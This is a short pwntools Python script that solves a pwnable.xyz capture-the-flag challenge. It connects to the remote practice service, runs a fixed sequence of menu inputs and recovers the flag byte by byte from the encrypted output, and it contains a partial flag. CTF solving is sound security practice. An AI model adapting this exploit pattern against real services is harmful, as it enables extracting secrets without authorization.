from pwn import *

context.terminal = ['xterm', '-e']

flag = 'FLAG{this_was_called_OTP_I_think}'
for i in range(len(flag)-1, 0x31):
    """ r = process('./challenge') """
    r = remote('svc.pwnable.xyz' , 30006)
    r.recvuntil('> ')
    r.sendline('3')
    r.recvuntil('? ')
    r.sendline('y')
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil(': ')
    r.sendline('64')
    l = r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil(': ')
    r.sendline(str(i))
    l = r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('> ')
    r.sendline('3')
    l = r.recvline()
    r.recvuntil('? ')
    r.sendline('n')
    enc = r.recvline()
    enc = enc.split(b'. ')[0]

    flag += chr(enc[i]) # this is the cleartext value
    print(flag)
    r.close()
print(flag)






